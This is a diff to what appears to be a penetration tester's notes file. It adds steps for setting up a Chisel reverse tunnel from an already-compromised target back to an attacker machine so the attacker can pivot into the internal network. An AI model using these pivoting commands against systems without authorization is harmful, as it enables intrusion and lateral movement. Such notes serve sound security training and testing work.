@@ -129,6 +129,22 @@ https://www.youtube.com/watch?v=DM1B8S80EvQ
 delete route
 sudo route del -net <172.16.187.0> netmask <255.255.255.0> dev ligolo
 ```
+### Setting up Chisel
+You must already have foothold onto a machine. 
+```
+Upload chisel on onto the target host. Make sure the chisel binary is compatible with the host.
+
+On attacker box:
+chisel server -p <port> --reverse
+Will print a fingerprint string thats needed for target box
+
+On target box:
+chmod +x chisel
+./chisel client --fingerprint <long string> <attacker.ip:<port>> R:8000:<target.ip>:<port to forward to attacker on 8000>
+
+Now on the attacker box you should be able to interact with victim.ip through 127.0.0.1:8000
+```
+
 
 Powershell history
 ```
